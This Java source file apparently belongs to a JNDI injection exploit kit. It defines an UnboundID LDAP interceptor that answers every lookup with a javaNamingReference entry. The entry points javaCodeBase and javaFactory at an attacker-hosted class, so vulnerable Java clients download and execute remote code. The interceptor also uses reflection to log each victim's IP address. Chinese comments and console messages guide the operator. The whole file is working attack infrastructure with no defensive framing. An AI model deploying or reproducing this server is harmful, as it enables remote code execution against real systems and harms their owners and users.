package org.interceptor;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.URL;

public class HTTPOperationInterceptor extends InMemoryOperationInterceptor {
    private String classUrl;

    public HTTPOperationInterceptor(String classUrl) {
        this.classUrl = classUrl;
    }

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String base = result.getRequest().getBaseDN();
        Entry e = new Entry(base);
        try {
            sendResult(result, e);
        } catch (Exception e1) {
            e1.printStackTrace();
        }

    }

    protected void sendResult(InMemoryInterceptedSearchResult result, Entry e) throws Exception {
        //------------获取client ip-----------
        Class<?> aClass = Class.forName("com.unboundid.ldap.listener.interceptor.InterceptedOperation");
        Method getClientConnection = aClass.getDeclaredMethod("getClientConnection");
        getClientConnection.setAccessible(true);
        Object invoke = getClientConnection.invoke(result);

        Class<?> aClass2 = Class.forName("com.unboundid.ldap.listener.LDAPListenerClientConnection");
        Field socket = aClass2.getDeclaredField("socket");
        socket.setAccessible(true);
        Socket socket1 = (Socket) socket.get(invoke);

        SocketAddress remoteSocketAddress = socket1.getRemoteSocketAddress();
        System.out.println("收到ip: " + remoteSocketAddress.toString().substring(1) + " 的请求！");
        //---------------------------------------
        //截取class名字
        URL url = new URL(classUrl);
        String host = "";
        if(url.getPort() == -1){
            host = url.getHost();
        }else{
            host = url.getHost()+ ":" +url.getPort();
        }

        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaCodeBase", "http://" + host + "/");
        e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
        e.addAttribute("javaFactory", url.getPath().replace("/","").replace(".class",""));
        result.sendSearchEntry(e);
        System.out.println("已返回Class所在WEB服务地址，请查看是否接收到请求");
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

    }
}
